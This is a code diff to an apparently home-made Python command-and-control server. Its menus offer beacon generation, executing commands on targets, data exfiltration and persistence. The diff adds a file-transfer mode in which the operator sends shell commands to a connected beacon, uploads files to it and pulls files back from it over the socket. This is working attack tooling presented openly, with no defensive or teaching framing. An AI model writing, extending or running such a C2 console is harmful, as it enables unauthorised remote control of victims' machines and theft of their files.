@@ -20,10 +20,7 @@ def listener_module():
     print("Enter 0 To Exit To Main Menu")  
     print("=" * 40)     
     
-    # i=0
-    # for soc in socket_list:
-    #     print("f{[i]}",soc.getpeername())
-    #     i=i+1   
+ 
     i=int(input("Select:"))
     if(i==0):
         os.system("cls")
@@ -53,7 +50,66 @@ def beacon_command(client_socket, client_address):
             socket_list.remove(client_socket)
             os.system("cls")
             return
-        time.sleep(1)       
+        time.sleep(1)  
+
+def beacon_file_transfer(client_socket, client_address):
+    os.system("cls")
+    print("File Transfer Mode")
+    client_socket.send("File Transfer Mode".encode())
+
+    while True:
+        
+        command = input("$ ").strip()
+        client_socket.send(command.encode())
+        
+        if command == "exit":
+            os.system("cls")
+            return
+        elif command == "nuke":
+            client_socket.close()
+            socket_list.remove(client_socket)
+            os.system("cls")
+            return
+        elif command.startswith("send"):
+            # Sending file to client
+            try:
+                _, file_path = command.split(" ", 1)
+                if os.path.exists(file_path):
+                    # client_socket.send(f"send {os.path.basename(file_path)} ".encode())
+                    ack = client_socket.recv(1024).decode()
+                    if ack == "READY":
+                        
+                        with open(file_path, "rb") as file:
+                            while chunk := file.read(1024):
+                                client_socket.send(chunk)
+                            client_socket.send("DONE".encode())
+                            print(f"Uploaded :{file_path}")
+                        print("")
+                    else:
+                        print("")
+                else:
+                    print(f"File '{file_path}' does not exist.")
+            except Exception as e:
+                print(f"Error: {e}")
+        elif command.startswith("recv"):
+            # Receiving file from client
+            try:
+                _, file_name = command.split(" ", 1)
+                client_socket.send(f"recv {file_name}".encode())
+                with open(file_name, "wb") as file:
+                    while True:
+                        chunk = client_socket.recv(1024)
+                        if chunk == b"DONE":
+                            break
+                        file.write(chunk)
+                print(f"File '{file_name}' received successfully.")
+            except Exception as e:
+                print(f"Error: {e}")
+        else:
+            output = client_socket.recv(10240)
+            print(output.decode())
+        
+        time.sleep(1)
 
 
 
@@ -85,6 +141,10 @@ def manage_client(client_socket, client_address):
         if int(response) == 1:
             
             beacon_command(client_socket, client_address)
+
+        if int(response) == 2:
+            
+            beacon_file_transfer(client_socket, client_address)    
 
             
         # client_socket.send(response.encode('utf-8'))
@@ -129,7 +189,7 @@ def menu():
     print("2. Payload/Beacon Generation")
     print("3. Configure C2 Server")
     print("4. Communication Channel Setup")
-    print("5. Execute Commands on Target")
+    print("5. List Connections")
     print("6. Data Exfiltration Setup")
     print("7. Persistence Mechanism Setup")
     print("8. Exit")
@@ -139,7 +199,7 @@ def menu():
 def beacon_menu():
     print("Select an option for the beacon:")
     print("1. Execute Commands on Target")
-    print("2. Upload Files")
+    print("2. File Transfer")
     print("3. Download Files")
     print("4. Persistence Mechanism Setup")
     print("5. Data Exfiltration")
